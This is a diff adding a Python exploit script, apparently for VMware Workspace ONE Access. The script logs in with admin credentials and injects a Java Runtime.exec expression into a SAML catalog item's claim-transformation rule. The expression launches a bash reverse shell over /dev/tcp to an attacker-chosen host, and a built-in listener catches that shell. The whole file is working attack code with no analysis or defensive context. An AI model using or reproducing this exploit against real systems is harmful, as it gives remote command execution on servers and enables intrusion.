@@ -1,0 +1,90 @@
+#!/usr/bin/env python3
+
+import re
+import sys
+import socket
+import requests
+from telnetlib import Telnet
+from threading import Thread
+from colorama import Fore, Style, Back
+from urllib3 import disable_warnings, exceptions
+from urllib.parse import urlparse
+disable_warnings(exceptions.InsecureRequestWarning)
+
+def login(t, u , p):
+    r = requests.get(f"https://{t}/SAAS/auth/login", verify=False, allow_redirects=False)
+    m = re.search("protected_state\" value=\"([a-zA-Z0-9]*)\"", r.text)
+    assert m, "(-) cannot find protected_state!"
+    s = requests.Session()
+    s.post(f"https://{t}/SAAS/auth/login/embeddedauthbroker/callback", data={
+        "protected_state": m.group(1),
+        "username": u,
+        "password": p
+    }, verify=False)
+    return s
+
+def trigger_rce(t, rhost, rport, s):
+    j = {
+        "catalogItemType":"Saml11",
+        "authInfo": {
+            "type":"Saml11",
+            "configureAs":"manual",
+            "nameIdClaimTransformation":{
+                "name":"",
+                "format":"",
+                "rules":[
+                    {
+                        "condition":f"java.lang.Runtime.getRuntime().exec(\"sh -c $@|sh . echo bash -i >& /dev/tcp/{rhost}/{rport} 0>&1\");",
+                        "order":1337,
+                        "action":{
+                            "name":"prefix",
+                            "args":[]
+                        }
+                    }
+                ]
+            }
+        }
+    }
+    s.headers.update({
+        'content-Type': 'application/vnd.vmware.horizon.manager.catalog.saml11+json'
+    })
+    r = s.post(f"https://{t}/SAAS/jersey/manager/api/catalogitems", json=j, verify=False)
+    assert "X-XSRF-TOKEN" in r.headers, "(-) cannot find csrf token!"
+    s.headers.update({'X-XSRF-TOKEN': r.headers['X-XSRF-TOKEN']})
+    s.post(f"https://{t}/SAAS/jersey/manager/api/catalogitems", json=j, verify=False)
+
+def handler(lp):
+    print(f"(+) starting handler on port {lp}")
+    t = Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"(+) connection from {addr[0]}")
+    t.sock = conn
+    print(f"(+) {Fore.BLUE + Style.BRIGHT}pop thy shell!{Style.RESET_ALL}")
+    t.interact()
+
+def main():
+    global rhost, rport
+    if len(sys.argv) != 4:
+        print("(+) usage: %s <hostname> <connectback> <admin creds>" % sys.argv[0])
+        print("(+) eg: %s target.tld 172.18.182.204 admin:Admin22#" % sys.argv[0])
+        sys.exit(1)
+    assert ":" in sys.argv[3], "(-) credentials need to be in user:pass format"
+    target = sys.argv[1]
+    rhost = sys.argv[2]
+    rport = 1337
+    if ":" in sys.argv[2]:
+        rhost = sys.argv[2].split(":")[0]
+        assert sys.argv[2].split(":")[1].isnumeric(), "(-) connectback port must be a number!"
+        rport = int(sys.argv[2].split(":")[1])
+    usr = sys.argv[3].split(":")[0]
+    pwd = sys.argv[3].split(":")[1]
+    s = login(target, usr, pwd)
+    handlerthr = Thread(target=handler, args=[rport])
+    handlerthr.start()
+    trigger_rce(target, rhost, rport, s)
+
+if __name__ == "__main__":
+    main()
